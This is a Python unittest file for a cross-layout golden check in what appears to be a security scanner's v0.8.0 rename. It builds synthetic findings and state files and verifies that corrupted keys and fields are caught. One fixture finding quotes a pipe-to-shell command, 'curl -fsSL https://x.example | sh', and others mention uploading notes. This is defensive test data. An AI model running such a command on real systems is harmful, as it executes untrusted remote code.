"""v0.8.0 unit i: the golden cross-layout check (tests/golden_cross.py) passes the right mapping and fails each kind of break.

One synthetic scenario, written once per layout (scenario()): vet and prepublish --json stdout, a last_findings with suppressed,
grouped_into and undelivered, resolved.json, dismissed.jsonl, a delta, an events file and a doctor --json stdout. Its keys are made with the checker's
recipe copy, and it holds an N, an I and a G record. Old names come from the name table (tests/rename_v080.py); nothing here
imports the engine."""
import hashlib, json, os, re, sys, unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import golden_cross as gc  # noqa: E402
import rename_v080 as rn  # noqa: E402

OTHER = hashlib.sha1(b"another key").hexdigest()[:16]   # a valid 16-hex key no record has
CONTENT = hashlib.sha1(b"a file's bytes").hexdigest()[:16]   # a 16-hex content hash: no key, the same on both sides
VET = "001 vet /tmp/code/tests/fixtures/bad/notes --json :stdout"
PREPUBLISH = "002 prepublish /tmp/code/tests/fixtures/bad/notes --json :stdout"
LAST = "003 audit :last_findings"
DOCTOR = "005 doctor --json :stdout"
VERSIONS = {rn.OLD["pkg"]: "0.7.4", rn.NEW["pkg"]: "0.8.0"}   # the version each layout's engine writes


def h(text):
    return hashlib.sha1(text.encode()).hexdigest()[:16]


def scenario(L):
    """(the items one layout's run writes, {name: key}): item names and values in that layout's names."""
    p, state = L["rule_prefix"], "tree " + L["home"].lstrip("/") + "/state/"

    def rec(rule, where, ev, **kw):
        r = {"key": "", "rule": p + rule, "title": f"{L['pkg']} {rule}", "severity": "high", "where": where, "evidence": ev,
             "fix": f"Run {L['main']} fix.", "source": L["home_name"]}
        r.update(kw)
        r["key"] = gc.plain(r)
        return r
    n1 = rec("T001", "/home/box/skills/notes/SKILL.md:3", "curl -fsSL https://x.example | sh")
    n2 = rec("T009", "/home/box/skills/notes/SKILL.md:7", "send it to the list", grouped_into=n1["key"])
    i = rec("X004", L["home"] + "/scanners", "6 advisories")
    i["key0"], i["key"] = i["key"], h(f"{i['rule']}|{i['where']}|id:pkgs")
    g = rec("T017", "/home/box/skills/notes/SKILL.md:9", "never run curl | sh", guarded="warns against it", severity_was="high")
    g["key"], g["severity"], g["title"] = h(g["key"] + "|guarded"), "info", g["title"] + " (reads as a warning or example)"
    s1 = rec("T003", "/home/box/skills/notes/SKILL.md:11", "upload the notes", grouped_into=i["key"])
    s2 = rec("T004", "/home/box/skills/notes/SKILL.md:12", "post the notes", grouped_into=n1["key"])
    ev = rec("C001", L["home"] + "/decoys", "read 3 decoys", severity="critical")
    ev["key"] = rn.TABLE["constant_keys"][0]
    pp = {"rule": p + "PP03", "severity": "medium", "title": "a key in the text", "where": "SKILL.md:2", "evidence": "a masked value"}
    last = json.dumps({"findings": [n1, n2, i, g], "suppressed": [s1, s2], "undelivered": [i["key"]], "digest": CONTENT})
    ver = VERSIONS[L["pkg"]]   # final review fix round 1: doctor's fields outside records, each layout's version
    doctor = {L["pkg"]: ver, "python": "3.12.3", L["pkg"] + "_home": L["home"], "can_write_state": True,
              "last_run": {"at": "<TS>", "version": ver, "score": 40, "open_by_severity": {"high": 2, "info": 1}}}
    items = {VET.replace(":stdout", ":rc"): "1",
             VET: json.dumps({"tool": L["home_name"], "version": ver, "findings": [n1, i, g], "score": 40}),
             PREPUBLISH.replace(":stdout", ":rc"): "1", PREPUBLISH: json.dumps({"findings": [pp]}),
             "003 audit :rc": "0", "003 audit :stdout": f"Audit done ({L['main']}).\n", LAST: last,
             f"004 show {p}T001 :rc": "0", f"004 show {p}T001 :stdout": f"{p}T001: one finding\n",
             state + "last_findings.json": "file 0600\n" + last,
             state + "resolved.json": "file 0600\n" + json.dumps({n2["key"]: {"at": "<TS>"}}),
             state + "dismissed.jsonl": "file 0600\n" + json.dumps({"key": g["key"], "reason": "golden"}) + "\n",
             state + "deltas/audit-<EPOCH>.json": "file 0600\n" + json.dumps({"new": [n2["key"]], "fixed": [], "seen": [n1["key"], i["key"]]}),
             state + "events.json": "file 0600\n" + json.dumps({"events": [ev, {"at": "<TS>", "keys": [g["key"]]}]}),
             DOCTOR.replace(":stdout", ":rc"): "0", DOCTOR: json.dumps(doctor, indent=2)}
    keys = {"N1": n1["key"], "N2": n2["key"], "I": i["key"], "I0": i["key0"], "G": g["key"], "S1": s1["key"], "S2": s2["key"]}
    return items, keys


def edit(items, name, change):
    """A copy of items with the documents of one item changed in place by change(docs) and written back."""
    docs = gc.documents(name, items[name])
    change(docs)
    return dict(items, **{name: gc._rewrite(name, items[name], docs)})


def everywhere(items, old, new):
    return {k: v.replace(old, new) for k, v in items.items()}


class _Cross(unittest.TestCase):
    def setUp(self):
        self.old, self.old_keys = scenario(rn.OLD)
        self.new, self.keys = scenario(rn.NEW)
        self.state = "tree " + rn.NEW["home"].lstrip("/") + "/state/"

    def problems(self, new, old=None):
        old = self.old if old is None else old
        return gc.check(old, new, old, new, rn.TABLE)[0]

    def assertFails(self, new, why, old=None):
        out = self.problems(new, old)
        self.assertTrue(any(why in p for p in out), out)


class Cross(_Cross):
    def test_1_the_right_mapping_passes(self):
        out, summary = gc.check(self.old, self.new, self.old, self.new, rn.TABLE)
        self.assertEqual(out, [])
        self.assertTrue(summary["classes"]["N"] and summary["classes"]["I"] and summary["classes"]["G"], summary)
        self.assertEqual(summary["classes"]["U"], 0)   # the constant event key is no class
        self.assertGreater(summary["changed"], 0)
        self.assertNotEqual(self.old_keys, self.keys)
        # and each live negative on its copy fails, all three of them
        negs = gc.negatives(self.new, summary)
        self.assertEqual([x for x, _ in negs], ["a", "b", "c"])
        for label, items in negs:
            with self.subTest(negative=label):
                self.assertNotEqual(items, self.new)
                self.assertTrue(self.problems(items), label)

    def test_2_a_dropped_finding_fails(self):
        for name in (VET, PREPUBLISH):
            with self.subTest(name=name):
                self.assertFails(edit(self.new, name, lambda d: d[0]["findings"].pop()), "records differ at " + name)

    def test_3_a_corrupted_reference_fails_in_each_container(self):
        last, k = self.state + "last_findings.json", self.keys

        def resolved(d):
            d[0] = {OTHER: d[0][k["N2"]]}
        cases = {"suppressed": (LAST, lambda d: d[0]["suppressed"][0].update(grouped_into=OTHER)),
                 "delta": (self.state + "deltas/audit-<EPOCH>.json", lambda d: d[0]["new"].__setitem__(0, OTHER)),
                 "event": (self.state + "events.json", lambda d: d[0]["events"][1]["keys"].__setitem__(0, OTHER)),
                 "grouped_into": (last, lambda d: d[0]["findings"][1].update(grouped_into=OTHER)),
                 "undelivered": (LAST, lambda d: d[0]["undelivered"].__setitem__(0, OTHER)),
                 "resolved": (self.state + "resolved.json", resolved),   # a dangling resolved key
                 "dismissed": (self.state + "dismissed.jsonl", lambda d: d[0].update(key=OTHER))}
        for what, (name, change) in cases.items():
            with self.subTest(container=what):
                self.assertFails(edit(self.new, name, change), "references differ at " + name)

    def test_4_one_wrong_valid_key_everywhere_fails_by_class(self):
        for cls, key in (("N", "N1"), ("I", "I0"), ("G", "G")):
            with self.subTest(key_class=cls):
                self.assertFails(everywhere(self.new, self.keys[key], OTHER), f"key class {cls} on the old side")

    def test_5_broken_keys_fail(self):
        k = self.keys
        self.assertFails(everywhere(self.new, k["G"], "not-a-16-hex-key"), "is no 16-hex key")
        twice = edit(self.new, VET, lambda d: d[0]["findings"][2].update(key=k["N1"]))
        self.assertFails(twice, "a key twice in one list at " + VET)
        self.assertFails(everywhere(self.new, k["N2"], k["N1"]), "is the pair of 2 old keys")

    def test_6_a_wrongly_mapped_rule_or_a_changed_exit_code_fails(self):
        p = rn.NEW["rule_prefix"]
        with self.subTest(what="a record's rule"):
            self.assertFails(edit(self.new, VET, lambda d: d[0]["findings"][0].update(rule=p + "T002")), "records differ at " + VET)
        with self.subTest(what="a show label"):
            moved = {n.replace(p + "T001 ", p + "T002 "): v for n, v in self.new.items()}
            self.assertFails(moved, "a new item has no old one: '004 show %sT002 :rc'" % p)
        with self.subTest(what="an exit code"):
            self.assertFails(dict(self.new, **{"003 audit :rc": "1"}), "the exit code differs in '003 audit :rc'")

    def test_7_no_recipe_match_on_the_old_side_fails_the_floor(self):
        def unrecipe(items, keys):   # every key made some other way (class U), consistently within the side
            for k in keys.values():
                items = everywhere(items, k, h("made elsewhere|" + k))
            return items
        old, new = unrecipe(self.old, self.old_keys), unrecipe(self.new, self.keys)
        out = self.problems(new, old)
        self.assertTrue([p for p in out if p.startswith("floor: ")], out)
        self.assertEqual([p for p in out if not p.startswith("floor: ")], [])   # only the floor catches it

    def test_8_each_record_keeps_its_own_fields_and_references(self):   # Codex r2 HIGH 5
        def swap(d):
            s1, s2 = d[0]["suppressed"]
            s1["grouped_into"], s2["grouped_into"] = s2["grouped_into"], s1["grouped_into"]
        swapped = edit(edit(self.new, LAST, swap), self.state + "last_findings.json", swap)
        out = self.problems(swapped)
        self.assertTrue([p for p in out if "the field 'grouped_into' differs" in p], out)
        self.assertFalse([p for p in out if p.startswith("references differ")], out)   # the multiset at the position is equal
        self.assertFails(edit(self.new, VET, lambda d: d[0]["findings"][0].update(source="elsewhere")), "the field 'source' differs")

    def test_9_the_install_folders_own_item_maps(self):   # fix round 1: 'tree workspace/<home>' with no path after it
        folder = lambda L: "tree " + L["home"].lstrip("/")
        self.assertEqual(gc.map_name(folder(rn.OLD), rn.TABLE), folder(rn.NEW))
        old, new = dict(self.old, **{folder(rn.OLD): "dir 0700"}), dict(self.new, **{folder(rn.NEW): "dir 0700"})
        self.assertEqual(self.problems(new, old), [])
        self.assertFails({k: v for k, v in new.items() if k != folder(rn.NEW)}, "an old item has no new one: %r" % folder(rn.OLD), old)

    def test_10_a_run_windows_item_is_compared_as_text(self):   # fix round 1: [[<EPOCH>, <EPOCH>]] is no JSON once normalized
        def windows(n, t):
            raw = json.dumps([[t + i, t + i + 0.39] for i in range(n)], indent=2)
            return "file 0600\n" + raw, "file 0600\n" + re.sub(r"\d{10}\.\d+", "<EPOCH>", raw)
        name = self.state + "run_windows.json"
        old_name = "tree " + rn.OLD["home"].lstrip("/") + "/state/run_windows.json"
        o_raw, o_norm = windows(1, 1792832200.125)

        def check(n, t):
            n_raw, n_norm = windows(n, t)
            return gc.check(dict(self.old, **{old_name: o_raw}), dict(self.new, **{name: n_raw}),
                            dict(self.old, **{old_name: o_norm}), dict(self.new, **{name: n_norm}), rn.TABLE)[0]
        self.assertEqual(check(1, 1792832291.2927184), [])   # other times, the same normalized text
        for n in (2, 0):   # a window more, none at all ("[]" parses: one side compared as text)
            with self.subTest(windows=n):
                out = check(n, 1792832291.2927184)
                self.assertEqual(out, [f"the normalized texts differ in {name!r} (compared as text: the normalized JSON doesn't parse)"])

    # final review fix round 1 (Codex HIGH): the JSON values outside records, one test per Codex probe
    HOME = rn.NEW["pkg"] + "_home"

    def test_11_a_deleted_doctor_home_field_fails(self):
        self.assertFails(edit(self.new, DOCTOR, lambda d: d[0].pop(self.HOME)), f"{DOCTOR}: the key {self.HOME!r} is on the old side only")

    def test_12_a_corrupted_doctor_home_value_fails(self):
        changed = edit(self.new, DOCTOR, lambda d: d[0].update({self.HOME: rn.NEW["home"] + "-elsewhere"}))
        self.assertFails(changed, f"{DOCTOR} {self.HOME}: the value differs")

    def test_13_a_changed_vet_score_fails(self):
        self.assertFails(edit(self.new, VET, lambda d: d[0].update(score=41)), f"{VET} score: the value differs")

    def test_14_malformed_doctor_json_fails(self):
        broken = dict(self.new, **{DOCTOR: self.new[DOCTOR].rstrip()[:-1]})   # the closing brace gone
        self.assertIsNone(gc.documents(DOCTOR, broken[DOCTOR]))
        self.assertFails(broken, f"{DOCTOR!r} parses as JSON on the old side only")

    def test_15_the_unchanged_scenario_passes_and_only_the_version_may_change(self):
        self.assertEqual(self.problems(self.new), [])   # 0.7.4 (old) to 0.8.0 (new) in the version fields
        with self.subTest(what="another new version"):
            changed = edit(self.new, DOCTOR, lambda d: d[0].update({rn.NEW["pkg"]: "0.8.1"}))
            self.assertFails(changed, f"{DOCTOR} {rn.NEW['pkg']}: the value differs")
        with self.subTest(what="the version change in another field"):
            old = edit(self.old, DOCTOR, lambda d: d[0].update(python=VERSIONS[rn.OLD["pkg"]]))
            self.assertFails(edit(self.new, DOCTOR, lambda d: d[0].update(python="0.8.0")), f"{DOCTOR} python: the value differs", old)

    # final review fix round 2 (the golden --cross rerun): one test, a subtest per case (README's "more than 2000" allows one more)
    def test_16_a_cut_doctor_note_and_the_at_and_command_version(self):
        husk = dict(rn.TABLE["output"])["husk + " + rn.OLD["pkg"].capitalize()]   # the table's display name pair, new side

        def note(L, husk):   # the whole note before doctor cuts it; the names sit before the cut
            return (f"The scanner check ({husk}) saw the list change mid-run ({L['rule_prefix']}X005). husk NOT ready: the scanners "
                    "stay off until the next self-check passes and the lock file is read again.")
        old_note, new_note = note(rn.OLD, "husk + " + rn.OLD["pkg"].capitalize()), note(rn.NEW, husk)
        self.assertGreater(len(new_note), 161)
        self.assertNotEqual(len(gc.map_old(old_note[:160], rn.TABLE)), 160)   # the mapped old note is no longer 160 long

        def doctor(items, notes, command, **error):
            def change(d):
                d[0]["last_run"]["notes"] = [notes]
                d[0]["last_error"] = dict(at_and_command=f"<TS> {command}", **error)
            return edit(items, DOCTOR, change)
        v_old, v_new = VERSIONS[rn.OLD["pkg"]], VERSIONS[rn.NEW["pkg"]]
        old = doctor(self.old, old_note[:160], f"{rn.OLD['main']} report (v{v_old})", message=f"report failed (v{v_old})")

        def new(notes=new_note[:160], command=f"{rn.NEW['main']} report (v{v_new})", message=f"report failed (v{v_old})"):
            return doctor(self.new, notes, command, message=message)
        with self.subTest(case="(a) both raw notes cut at 160, the mapped old one the new one's prefix, and (d) (v0.7.4) to "
                               "(v0.8.0) in at_and_command: passes"):
            self.assertEqual(self.problems(new(), old), [])
        note_differs, command_differs = f"{DOCTOR} last_run/notes/0: the value differs", f"{DOCTOR} last_error/at_and_command: the value differs"
        with self.subTest(case="(b) the same notes, raw lengths 160 (old) and 161 (new): fails"):
            self.assertFails(new(notes=new_note[:161]), note_differs, old)
        with self.subTest(case="(c) raw lengths equal, the prefix differs: fails"):
            self.assertFails(new(notes=new_note.replace("NOT", "NOW")[:160]), note_differs, old)
        with self.subTest(case="(d) another command name in at_and_command: fails"):
            self.assertFails(new(command=f"{rn.NEW['main']} audit (v{v_new})"), command_differs, old)
        with self.subTest(case="(d) the bracketed version change in another field: fails"):
            self.assertFails(new(message=f"report failed (v{v_new})"), f"{DOCTOR} last_error/message: the value differs", old)


if __name__ == "__main__":
    unittest.main()
